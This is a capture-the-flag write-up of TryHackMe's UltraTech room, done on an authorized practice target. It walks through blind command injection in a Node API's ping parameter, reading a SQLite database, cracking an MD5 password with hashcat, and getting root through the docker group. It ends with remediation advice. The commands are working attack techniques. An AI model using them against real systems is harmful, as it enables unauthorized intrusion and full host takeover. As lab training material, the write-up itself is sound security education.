# TryHackMe: UltraTech — A Hidden API, Command Injection, and a Docker Group

*A walkthrough of the "UltraTech" room. A stray JavaScript file points at an
undocumented Node.js API; one of its endpoints runs `ping` on user input, which
means command injection. From there we read the app's SQLite database, crack a
password, log in over SSH, and ride the `docker` group straight to root.*

> Flag values are redacted. UltraTech is a retired training box on TryHackMe;
> everything here was done against an authorized practice target.

---

## TL;DR — the whole chain

`?ip=` command injection on a hidden Node API → read `utech.db.sqlite` →
crack the `r00t` MD5 hash → SSH in → `docker` group → **root**.

## The target

```bash
export IP=<target-ip>
nmap -sC -sV -p- -T4 --min-rate=1000 $IP
```

```
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 (Ubuntu)
8081/tcp  open  http    Node.js Express framework      # CORS: HEAD GET POST PUT DELETE PATCH
31331/tcp open  http    Apache 2.4.41 (Ubuntu)         # "UltraTech - The best of technology"
```

Four ports, and the interesting pair is the two web services. Port 31331 is the
public marketing site on Apache. Port 8081 is a bare Node.js/Express API with a
permissive CORS policy that even allows `PUT`, `DELETE`, and `PATCH`. FTP and SSH
both need credentials we don't have yet, so the web is where we start.

## Enumeration: let the site tell us about its API

Directory brute force on the main site:

```bash
gobuster dir -u http://$IP:31331/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,txt,js,html,bak
```

```
css/  images/  javascript/  js/  index.html  partners.html  what.html  robots.txt
```

Nothing dramatic — but the payoff is in the JavaScript. Reading the site's JS
reveals a route that talks to the Node API on port **8081**, including its
parameters. One endpoint takes an IP address and *pings* it server-side.

Any time a web app pings something you supply, ask the obvious question: is that
value going straight to a shell?

## Confirming command execution out-of-band

We can't see the ping output, so prove execution with an out-of-band signal.
Start a sniffer for ICMP and point the endpoint at our own box:

```bash
sudo tcpdump -i tun0 icmp
# then hit the API with ?ip=<attacker-ip>
```

```
IP <target-ip> > <attacker-ip>: ICMP echo request
IP <attacker-ip> > <target-ip>: ICMP echo reply
```

The target really does ping us, so the parameter reaches a shell. That's a
**command injection** primitive: the value is concatenated into a `ping` call,
and a backtick (`` ` ``) breaks out of it to run arbitrary commands.

## Foothold: injection into the SQLite database

The Express app keeps its users in a local SQLite file, `utech.db.sqlite`.
Injecting a command that reads that file leaks its contents into the response,
and out fall two accounts with MD5 password hashes:

| User | Hash |
|---|---|
| r00t | `f357a0c52799563c7c7b76c1e7543a32` |
| admin | `0d0ea5111e3c1def594c1684e3b9be84` |

MD5 is unsalted and fast, so hashcat cracks it in seconds:

```bash
echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# f357a0c52799563c7c7b76c1e7543a32:n100906
```

We now have `r00t` / `n100906`. That SSH port from the scan suddenly matters:

```bash
ssh r00t@$IP        # password: n100906
```

```
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Read the user flag from `r00t`'s home (value redacted).

## Privilege escalation: the docker group is root

Look closely at that `id` output: `r00t` is in the **docker** group. That is
effectively root, by design. The Docker daemon runs as root, and any group member
can start a container that mounts the host's filesystem and drops into a root
shell over it. Check which images exist, then use one:

```bash
docker images
# REPOSITORY  TAG     ...
# bash        latest  ...

docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami -> root
```

`-v /:/mnt` bind-mounts the host root inside the container and `chroot /mnt` makes
it our `/`. We are now root on the real filesystem — free to read the root flag
and `/root/.ssh/id_rsa` (values redacted).

> Note the image name. Many writeups use `alpine`, but this box only has `bash`
> locally, so `docker images` first, then swap the name. Any local image works.

## Severity

**High.** An unauthenticated command injection in a network-reachable API leads
to database disclosure, credential compromise, and — via the `docker` group — a
full root takeover of the host. No authentication and no user interaction are
required to begin.

## Remediation — break the chain at any rung

1. **Command injection** — never build a shell command from user input. Use an
   argument-array API (`execFile`/`spawn` with an args list, not `exec` with a
   string) and validate the input against a strict IP allow-list.
2. **Password storage** — MD5 is not a password hash. Use bcrypt/argon2 with a
   salt, and don't ship the database inside the web root.
3. **The docker group** — don't add service or login users to it unless they are
   trusted as root. Prefer rootless Docker or a scoped socket proxy.

## Takeaways

- **Read the JavaScript.** The whole attack surface — a second API on another
  port — was hidden from the landing page but spelled out in a JS file.
- **Prove blind execution out-of-band.** A `tcpdump` on ICMP confirms a command
  runs before you waste time guessing injection syntax.
- **A file-based DB is loot.** SQLite creds are one command-injection read away,
  and unsalted MD5 falls instantly to `rockyou`.
- **`docker` group == root.** `docker run -v /:/mnt ... chroot /mnt sh` is the
  standard escape — just remember to use an image the box actually has.

Thanks for reading. UltraTech is a tidy lesson in following one clue to the next:
a JS file to an API, an API to a database, a database to SSH, and a group
membership to root.
